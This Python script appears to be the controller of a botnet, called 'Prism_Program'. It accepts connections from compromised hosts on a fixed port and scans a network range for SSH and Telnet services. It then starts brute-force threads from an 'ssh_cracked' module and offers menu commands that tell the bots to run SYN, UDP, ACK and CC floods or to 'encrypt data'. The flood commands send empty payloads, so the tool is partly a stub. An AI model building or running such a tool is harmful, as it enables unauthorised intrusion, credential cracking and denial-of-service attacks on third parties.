#!/usr/bin/python

import sys
import os
import socket
import Queue
import netaddr
import threading
import time
from scapy.all import *


def useage():
    print '''-h or --help   **---Help function
             -l or --alive  **---View the current live host
             -s or --scan   **---Scarch the network segment
             -a or --attack   **---Perform an attack
    '''
def useage_command():
    print '''Please choose your attack mode:
             -S or --syn    **---syn flood
             -U or --udp    **---udp flood
             -A or --ack    **---ack flood
             -C or --cc     **---cc flood
             -E or --encryption **--encryption data
    '''

def cook(pkt):
    global target_host
    if target_host.empty():
        print 'See the packet!'
        print pkt[IP].src,pkt[TCP].sport
        target_host.put((pkt[IP].src,pkt[TCP].sport))
    elif not target_host.empty():
        target_host_list = []
        while not target_host.empty():
            if len(target_host_list)==0:
                target_host_list.append(target_host.get())
            elif len(target_host_list)!=0:
                ip_info=target_host.get()
                if ip_info not in target_host_list:
                    print 'append'
                    target_host_list.append(ip_info)
        if (pkt[IP].src, pkt[TCP].sport) not in target_host_list:
            target_host_list.append((pkt[IP].src, pkt[TCP].sport))
        for t_h in target_host_list:
            target_host.put(t_h)

def sniffer():
    sniff(filter='tcp and dst port 7474 and src port 22 or src port 23', prn=cook)

live_host=Queue.Queue()
target_host=Queue.Queue()
server_listen_list_queue=Queue.Queue()
search_results=Queue.Queue()

def socket_listen():
    global live_host
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind(('192.168.9.118',7777))
    server.listen(10000)

    while True:
        live_host.put(server.accept())


def main():
    global live_host
    global target_host
    global server_listen_list_queue
    global search_results


    Current_path=os.getcwd()
    try:
        sys.path.append(Current_path+'/modules')
        #sys.path.append(Current_path+'/configuration')
    except:
        print 'import Error!'
        sys.exit(0)
    else:
        import ssh_cracked


    for i in range(5):
        th=threading.Thread(target=socket_listen)
        th.start()
        server_listen_list_queue.put(th)


    while True:
        command=raw_input('Prism_Program:>>')
        if command == '-h' or command =='--help':
            useage()
            continue
        elif command == '--alive' or command =='-l':
            print str(live_host.qsize())+'Host computer'
        elif command == '--scan' or command=='-s':
            ip_network_segment=raw_input('Please enter the segment you want to search for:')
            Net_ip_list=netaddr.IPNetwork(ip_network_segment)

            sniff_listen=threading.Thread(target=sniffer)
            sniff_listen.start()

            for Net_ip in Net_ip_list:
                send(IP(dst=str(Net_ip))/TCP(sport=7474,dport=(22,23)))
            time.sleep(120)

            while True:
                try:
                    I_want_threads=int(raw_input('Please enter the number of threads you want:'))
                except:
                    print 'Please note that your input can only enter numbers!'
                else:
                    for i in range(I_want_threads):
                        th=threading.Thread(target=ssh_cracked.scan,args=(target_host,search_results))
                        th.start()
                    print 'The search thread is executing........'
                    break

        elif command =='-a' or command =='--attack':
            if live_host.empty():
                print 'There is no currently no host available!'
                continue
            useage_command()
            command_choice=raw_input('Please enter you choice:')
            l_h_q=Queue.Queue()
            if command_choice == '-S' or command_choice =='--syn':
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            elif command_choice == '-U' or command_choice =='--udp':
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            elif command_choice == '-A' or command_choice =='--ack':
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            elif command_choice =='-C' or command_choice =='--cc':
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            elif command_choice=='E' or command_choice =='--encryption':
                while not live_host.empty():
                    l_h=live_host.get()
                    l_h[0].sendall('')
                    l_h_q.put(l_h)
            else:
                useage_command()

            while not l_h_q.empty():
                x=l_h_q.get()
                live_host.put(x)
        else:
            useage()


if __name__ == '__main__':
    main()
